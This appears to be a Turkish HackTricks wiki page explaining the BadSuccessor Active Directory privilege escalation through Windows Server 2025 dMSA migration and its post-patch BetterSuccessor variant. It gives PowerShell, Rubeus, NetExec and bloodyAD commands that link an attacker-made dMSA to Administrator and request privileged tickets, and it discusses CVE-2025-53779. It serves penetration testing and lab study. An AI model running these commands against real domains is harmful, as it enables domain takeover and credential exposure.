# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**BadSuccessor**, **Windows Server 2025**'te sunulan **delegated Managed Service Account** (**dMSA**) geçiş iş akışını kötüye kullanır. Bir dMSA, **`msDS-ManagedAccountPrecededByLink`** aracılığıyla eski bir hesaba bağlanabilir ve **`msDS-DelegatedMSAState`** içinde saklanan geçiş durumları arasında ilerletilebilir. Bir saldırgan, yazılabilir bir OU'da dMSA oluşturabiliyor ve bu öznitelikleri kontrol edebiliyorsa KDC, saldırganın kontrolündeki dMSA için **bağlı hesabın yetkilendirme bağlamıyla** biletler verebilir.<sup>[[2]](#references)</sup>

Pratikte bu, yalnızca devredilmiş OU haklarına sahip düşük ayrıcalıklı bir kullanıcının yeni bir dMSA oluşturup `Administrator` hesabına bağlayabileceği, geçiş durumunu tamamlayabileceği ve PAC'i **Domain Admins** gibi ayrıcalıklı grupları içeren bir TGT alabileceği anlamına gelir.<sup>[[2]](#references)</sup>

## Önemli dMSA geçiş ayrıntıları

- dMSA, **Windows Server 2025** özelliğidir.
- `Start-ADServiceAccountMigration`, geçişi **başlatıldı** durumuna getirir.
- `Complete-ADServiceAccountMigration`, geçişi **tamamlandı** durumuna getirir.
- `msDS-DelegatedMSAState = 1`, geçişin başlatıldığı anlamına gelir.
- `msDS-DelegatedMSAState = 2`, geçişin tamamlandığı anlamına gelir.
- Meşru geçiş sırasında dMSA'nın yerini aldığı hesabın yerini şeffaf biçimde alması amaçlanır; bu nedenle KDC/LSA, önceki hesabın sahip olduğu erişimi korur.<sup>[[3]](#references)</sup>

Microsoft Learn ayrıca geçiş sırasında özgün hesabın dMSA'ya bağlandığını ve dMSA'nın eski hesabın erişebildiği kaynaklara erişmesinin amaçlandığını belirtir.<sup>[[3]](#references)</sup> BadSuccessor'ın kötüye kullandığı güvenlik varsayımı budur.<sup>[[2]](#references)</sup>

## Gereksinimler

1. **dMSA'nın bulunduğu** bir etki alanı; yani AD tarafında **Windows Server 2025** desteği mevcut olmalıdır.
2. Saldırgan, bir OU'da `msDS-DelegatedManagedServiceAccount` nesneleri **oluşturabilmeli** veya bu OU'da eşdeğer kapsamda alt nesne oluşturma haklarına sahip olmalıdır.
3. Saldırgan, ilgili dMSA özniteliklerini **yazabilmeli** veya oluşturduğu dMSA'yı tamamen kontrol edebilmelidir.
4. Saldırgan, etki alanına katılmış bir bağlamdan ya da LDAP/Kerberos'a ulaşan bir tünel üzerinden Kerberos bileti isteyebilmelidir.<sup>[[2]](#references)</sup>

### Pratik kontroller

Operatör açısından en net gösterge, etki alanı/orman düzeyini doğrulamak ve ortamın yeni Server 2025 yığınını zaten kullandığını teyit etmektir:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

`Windows2025Domain` ve `Windows2025Forest` gibi değerler görürseniz, **BadSuccessor / dMSA migration abuse** konusunu öncelikli olarak kontrol edin.

Ayrıca, dMSA oluşturma yetkisi devredilmiş ve yazılabilir OU'ları public tooling ile listeleyebilirsiniz:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Kötüye kullanım akışı

1. Alt öğe oluşturma yetkisi devrettiğiniz bir OU'da dMSA oluşturun.
2. **`msDS-ManagedAccountPrecededByLink`** değerini `CN=Administrator,CN=Users,DC=corp,DC=local` gibi ayrıcalıklı bir hedefin DN'si olarak ayarlayın.
3. Geçişi tamamlandı olarak işaretlemek için **`msDS-DelegatedMSAState`** değerini `2` olarak ayarlayın.
4. Yeni dMSA için bir TGT isteyin ve ayrıcalıklı hizmetlere erişmek için döndürülen bileti kullanın.<sup>[[2]](#references)</sup>

PowerShell örneği:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ticket talebi / operasyonel araç örnekleri:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Bunun neden ayrıcalık yükseltmeden ibaret olmadığı

Meşru bir geçiş sırasında Windows'un, kesimden önce önceki hesap için verilen ticket'ları işleyebilmesi için yeni dMSA'ya da ihtiyacı vardır. dMSA ile ilgili ticket materyalinde **`KERB-DMSA-KEY-PACKAGE`** akışında **current** ve **previous** anahtarların bulunabilmesinin nedeni budur.<sup>[[2]](#references)</sup>

Saldırganın kontrolündeki sahte bir geçişte bu davranış, BadSuccessor'ı şu sonuçlara dönüştürebilir:<sup>[[2]](#references)</sup>

- PAC'te ayrıcalıklı grup SID'lerini devralarak **ayrıcalık yükseltme**.
- **Kimlik bilgisi materyalinin açığa çıkması**; çünkü previous-key işleme, savunmasız iş akışlarında predecessor'ın RC4/NT hash'ine eşdeğer materyali açığa çıkarabilir.

Bu nedenle teknik, hem doğrudan domain takeover hem de pass-the-hash ya da daha kapsamlı kimlik bilgisi ihlali gibi sonraki işlemler için kullanışlıdır.

## KDC yamasından sonra BetterSuccessor

Yama uygulanmış KDC, dMSA geçişinin her iki tarafını da doğrular. dMSA'nın `msDS-ManagedAccountPrecededByLink` ve geçiş durumunun yanı sıra predecessor da `msDS-SupersededManagedAccountLink` üzerinden dMSA'ya geri işaret etmeli ve uyumlu bir `msDS-SupersededServiceAccountState` değerine sahip olmalıdır. Tek yönlü bağlantı artık başarısız olur; yalnızca dMSA oluşturabilen bir hesap, istediği herhangi bir predecessor'ı belirleyemez. Bir OU'da dMSA için `CreateChild` **ve** seçilen hedef hesabın geçiş özniteliklerine etkin yazma erişimi olan bir saldırgan, karşılıklı bağlantıyı kurabilir. Ortaya çıkan dMSA ticket'ı predecessor'ın yetkilendirme bağlamını taşıyabilir ve anahtarlarını dMSA key package içinde açığa çıkarabilir. Bu, hedefli bir kimlik bilgisi erişimi/ayrıcalık artırma yoludur; orijinal, herhangi bir hedefi seçmeye izin veren BadSuccessor'ın yama uygulanmış DC'lerde hâlâ kullanılabildiğinin kanıtı değildir.<sup>[[5]](#references)[[6]](#references)</sup>

Hedef hesaba yazma erişiminin doğrulandığı bir lab ortamında `bloodyAD`, dMSA'yı oluşturup eşleşen geçiş yazmalarını gerçekleştirebilir. Döndürülen Kerberos materyalini kullanarak dMSA ticket'ını isteyin ve ayrıcalıklarının ya da hash'inin ele geçirildiğini varsaymadan önce hedef hesabın gerçek izinlerini kontrol edin. Aracın `badSuccessor` alt komutunun adı, yama uygulanmamış tek yönlü davranışın geçerli olduğu anlamına gelmez.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Yama durumu hakkında notlar

Orijinal BadSuccessor davranışı **yalnızca teorik bir 2025 önizleme sorunu değildir**. Microsoft bu davranışa **CVE-2025-53779** kimliğini atadı ve **Ağustos 2025'te** bir güvenlik güncellemesi yayımladı.<sup>[[4]](#references)</sup> Bu saldırıyı şu durumlar için belgelenmiş olarak tutun:

- **lab ortamları / CTF'ler / assume-breach çalışmaları**
- **yama uygulanmamış Windows Server 2025 ortamları**
- **değerlendirmeler sırasında OU delegasyonlarının ve dMSA maruziyetinin doğrulanması**

Sırf dMSA bulunduğu için bir Windows Server 2025 etki alanının savunmasız olduğunu varsaymayın; yama düzeyini doğrulayın ve dikkatlice test edin.

## Araçlar

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA kötüye kullanımıyla Domain Admin olma (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Active Directory'de ayrıcalıkları yükseltmek için dMSA kötüye kullanımı](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts'a genel bakış](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor öldü, yaşasın BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: Yama sonrasında da dMSA kötüye kullanımı](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
